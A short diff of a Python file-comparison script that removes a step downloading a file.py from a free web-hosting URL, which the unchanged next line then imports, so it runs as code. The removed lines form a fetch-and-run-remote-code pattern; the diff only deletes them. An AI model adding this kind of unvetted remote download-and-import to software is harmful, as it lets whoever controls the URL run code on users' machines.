@@ -3,11 +3,7 @@
 # Purpose: to find and report differences in two input files
 
 import os
-import urllib.request
 import platform
-
-url = 'http://urwrstkn8mare.000webhostapp.com/samit/projects/py/file.py'
-urllib.request.urlretrieve(url, 'file.py')
 import file
 
 
